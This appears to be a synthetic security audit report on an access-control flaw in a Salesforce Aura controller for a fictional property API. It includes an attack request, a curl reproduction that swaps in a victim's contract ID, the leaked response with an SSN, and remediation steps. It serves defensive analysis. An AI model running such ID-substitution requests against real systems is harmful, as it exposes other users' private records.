# Security Analysis Report
**System:** EstateFlow Property API (Salesforce-Integrated)
**Domain:** Real Estate / PropTech
**Example ID:** SF-0117
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority — attacker supplies any `contractId` in `c.ContractController.approveContract`, trusting client to scope their own access; `without sharing` bypasses OWD=Private |

---

## Finding 1 — Insecure Design: Client-Assumed Authority (Pattern 3.1)

### Summary
The Aura controller `c.ContractController.approveContract` on EstateFlow Property API (`6bc97668.lightning.force.com`) is an insecure design: the API assumes the client will only supply record IDs within their own authorization scope. The `ContractController` runs `without sharing`, bypassing OWD=Private on the Contract object. Per §5.0 Pattern 3.1, the system places authority in the client — it trusts the client-supplied `contractId` without any server-side ownership verification. An attacker substitutes a victim's `contractId` (`0017668`) to read their property Contract record, exposing SSN and internal notes.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getContractDetails`, but §5.0 and §6.0 HAR use `c.ContractController.approveContract`. These conflict. The HAR (§6.0) is the primary evidence — `c.ContractController.approveContract` is the authoritative affected Aura descriptor.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://6bc97668.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://6bc97668.lightning.force.com/aura
Authorization: Bearer 00D6BC97668!AR6bc97668...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D6BC97668!AR6bc97668...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.ContractController.approveContract",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "contractId": "0017668",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Contract Record Returned**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "0017668",
        "Name": "Victim Contract Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-91-4780"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-91-4780` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user.

### Steps to Reproduce
1. Authenticate to EstateFlow on `6bc97668.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `contractId`:
```bash
curl -s -X POST "https://6bc97668.lightning.force.com/aura" \
  -H "Authorization: Bearer 00D6BC97668!AR6bc97668..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00D6BC97668!AR6bc97668..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"0017668","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-91-4780) and InternalNotes__c for victim contract 0017668
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `ContractController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
